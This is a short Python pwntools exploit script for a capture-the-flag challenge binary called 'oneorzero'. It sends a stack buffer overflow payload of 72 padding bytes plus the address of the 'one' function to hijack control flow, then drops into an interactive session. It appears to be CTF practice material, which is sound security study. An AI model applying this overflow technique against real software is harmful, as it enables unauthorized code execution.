#!/usr/bin/python
from pwn import *

elf = context.binary = ELF("./../challenge/oneorzero", checksec=False)
# libc = ELF("./libc.so.6", checksec=False)
context.terminal = ['alacritty', '-e']
context.encoding = 'ascii'
context.gdbinit = '~/.config/gdb/.gdbinit'

gs = \
'''
'''

IP = "127.0.0.1"
PORT = 1337


def start(logging='notset'):
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(IP, PORT, level=logging)
    else:
        return process(elf.path, level=logging)


def pwn():
    io = start()

    io.sendlineafter("> ", b"\x01")
    io.sendlineafter("> ", b"A" * 72 + pack(elf.sym['one']))

    io.interactive()
    pause()


if __name__ == "__main__":
    pwn()
